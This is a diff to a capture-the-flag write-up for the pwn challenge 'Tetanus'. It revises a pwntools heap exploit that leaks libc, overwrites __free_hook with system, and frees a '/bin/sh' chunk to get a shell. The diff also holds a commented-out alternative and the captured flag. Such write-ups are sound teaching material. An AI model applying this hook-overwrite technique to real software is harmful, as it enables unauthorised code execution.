@@ -1,4 +1,5 @@
 # Tetanus
+pwn, 492
 
 ```python
 from pwn import *
@@ -71,8 +72,8 @@ libc.address = libc_leak - 0x1eabe0
 binsh = 0x68732f6e69622f
 
 print("libc address", hex(libc.address))
-#print("libc __free_hook", hex(libc.sym["__free_hook"]))
-print("libc __malloc_hook", hex(libc.sym["__malloc_hook"]))
+print("libc __free_hook", hex(libc.sym["__free_hook"]))
+#print("libc __malloc_hook", hex(libc.sym["__malloc_hook"]))
 print("libc system", hex(libc.sym["system"]))
 
 #one_gadget = libc.address + 0x10afa9
@@ -89,9 +90,18 @@ free(2)
 alloc(0x69) 	# c3
 alloc(0x69)	# c4
 alloc(0x69)	# c5, this the chunk w/ pointer to where we want to write
-append(5, libc.sym["system"], u64("/bin/sh;"))
 
-free(4)
+
+# -- This one spawns a shell for you by calling __free_hook with /bin/sh as the memory being freed --
+append(5, libc.sym["system"])
+alloc(0x10)
+append(6, u64("/bin/sh;"))
+free(6)
+
+# -- This one spawns a shell for you by utilizing the fact that rust mallocs and frees input, which in this case is the string "/bin/sh" --
+#append(5, libc.sym["system"])
+#p.recvuntil("> ")
+#p.sendline("/bin/sh")
 
 p.interactive()		#flag{w0w_wh0da_thunk_th4t_unsafe_means_unsafe_ls!}
 ```
